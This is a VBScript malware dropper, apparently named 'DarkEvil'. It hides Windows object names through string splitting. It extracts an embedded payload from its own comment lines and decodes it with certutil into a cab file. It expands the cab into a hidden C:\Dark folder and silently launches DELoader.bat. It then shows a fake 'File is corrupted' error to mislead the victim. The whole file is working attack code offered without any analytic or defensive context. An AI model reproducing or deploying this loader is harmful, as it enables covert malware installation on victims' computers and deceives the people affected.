Function DeCodeCertutilData(InFile,OutFile)
	Dim objShell,fso,error_code,command,ScriptSystemObjt,WscritShellObject
	
	ScriptSystemObjt = "Scrip" + "ting." + "File" + "System" + "Object"
	WscritShellObject = "WScript." + "Sh" + "ell"
	Set objShell = CreateObject(WscritShellObject)
	Set fso = CreateObject(ScriptSystemObjt)
	command = "certutil -decode " + """" + InFile + """ " + OutFile
	WScript.echo command
	error_code = objShell.Run (command,0,True)
End Function


Function ExtractCab(CabFile, ExtractPath)
	Dim objShell,fso,error_code,command,ScriptSystemObjt,WscritShellObject
	
	ScriptSystemObjt = "Scrip" + "ting." + "File" + "System" + "Object"
	WscritShellObject = "WScript." + "Sh" + "ell"
	Set objShell = CreateObject(WscritShellObject)
	Set fso = CreateObject(ScriptSystemObjt)
	command = "expand " + CabFile + " -F:* " + ExtractPath
	error_code = objShell.Run (command,0,True)
End Function


Function CreateHiddenDirectory(folderPath)
    Dim fso, folder

    Set fso = CreateObject("Scripting.FileSystemObject")

    If Not fso.FolderExists(folderPath) Then
        Set folder = fso.CreateFolder(folderPath)

        folder.Attributes = folder.Attributes + 2
    Else
        rem "The folder already exists."
    End If

    Set folder = Nothing
    Set fso = Nothing
End Function


Function StartClient(AutoStartFile)
	Dim objShell,error_code,WscritShellObject
	
	WscritShellObject = "WScript." + "Sh" + "ell"
	Set objShell = CreateObject(WscritShellObject)
	error_code = objShell.Run (AutoStartFile,0,True)
End Function


Dim objShell,WorkDir,output,ZipFile,AutoStartFile
WscritShellObject = "WScript." + "Sh" + "ell"
Set objShell = CreateObject(WscritShellObject)
TMPATH = objShell.ExpandEnvironmentStrings("%TEMP%")
SystemDrive = objShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")
output = TMPATH + "\output.txt"
WorkDir = SystemDrive + "\Dark\"
ZipFile = WorkDir + "DarkEvil.cab"
AutoStartFile = WorkDir + "DELoader.bat"

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.OpenTextFile(WScript.ScriptFullName, 1)

Set objCommentFile = objFSO.OpenTextFile(output, 2, True)

Do Until objFile.AtEndOfStream
    strLine = objFile.ReadLine
    If Left(Trim(strLine), 1) = "'" Then
        objCommentFile.WriteLine Mid(strLine, 2)
    End If
Loop

objFile.Close
objCommentFile.Close

Set objFile = Nothing
Set objCommentFile = Nothing
Set objFSO = Nothing


CreateHiddenDirectory WorkDir
DeCodeCertutilData output,ZipFile
ExtractCab ZipFile,WorkDir
StartClient AutoStartFile


MsgBox "File is corrupted" & Err.Description, vbExclamation, "Error"
